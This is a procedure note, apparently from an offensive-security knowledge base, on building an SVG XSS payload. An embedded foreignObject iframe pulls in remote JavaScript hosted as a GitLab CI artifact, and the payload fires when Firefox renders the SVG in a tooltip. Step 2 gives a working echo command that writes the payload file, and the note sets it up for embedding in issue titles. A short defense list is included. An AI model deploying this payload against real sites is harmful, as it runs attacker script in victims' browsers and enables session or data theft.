---
tags:
  - xss
  - svg
  - payload
type: procedure
tools:
  - '[[tools/GitLab-CI-CD]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-xss-svg-file]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 95abf256-f978-4d80-b2a3-1c9339584d60
created_at: '2025-12-13T23:52:43.687Z'
updated_at: '2025-12-13T23:52:43.687Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Embed-JavaScript-in-SVG-File-for-XSS-Payload

## Summary

This procedure creates an SVG file that embeds the malicious JavaScript from the CI/CD artifact using an iframe within a foreignObject, allowing the payload to execute when the SVG is rendered in a tooltip on Firefox.

## Description

The SVG uses <foreignObject> to include XHTML content, specifically an iframe with srcdoc pointing to the external JS artifact. When loaded via <use xlink:href>, Firefox processes the foreignObject and executes the script. Commit the SVG to the GitLab repo for raw access.

## Requirements

1. Artifact URL from previous procedure
2. GitLab repository access
3. Text editor or shell for file creation

## Defense

Defensive measures and detection strategies:

- Sanitize SVG inputs to block foreignObject and iframe elements
- Disable external resource loading in SVGs (e.g., via CSP or parser flags)
- Scan repository commits for suspicious SVG content

## Objectives

1. Encapsulate JS payload in a renderable SVG
2. Enable execution via browser SVG processing
3. Prepare for embedding in issue titles

## Instructions

### Step 1: Prepare SVG Content

**Context**: Construct the SVG with the iframe srcdoc loading the JS artifact.

Replace the URL with your actual artifact URL.

### Step 2: Create and Commit SVG File

**Context**: Write the SVG to a file using [[commands/create-xss-svg-file]].

**Command** ([[commands/create-xss-svg-file]]):
```bash
echo '<svg id="xss" xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc=\'&lt;script src=https://gitlab.com/username/project/-/jobs/123/artifacts/raw/alert.js&gt;&lt;/script&gt;\'&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg>' > xss.svg
```

> This echoes the SVG content to xss.svg, using HTML entities in srcdoc to avoid parsing issues. Commit and push to GitLab.

### Step 3: Verify SVG Accessibility

**Context**: Ensure the raw SVG is servable.

Access https://gitlab.com/username/project/-/raw/master/xss.svg in a browser; it should display without errors.

**Expected Output**: SVG renders; no syntax errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/create-xss-svg-file]]

## Tools Used

- [[tools/GitLab-CI-CD]]

## Tags

- xss
- svg
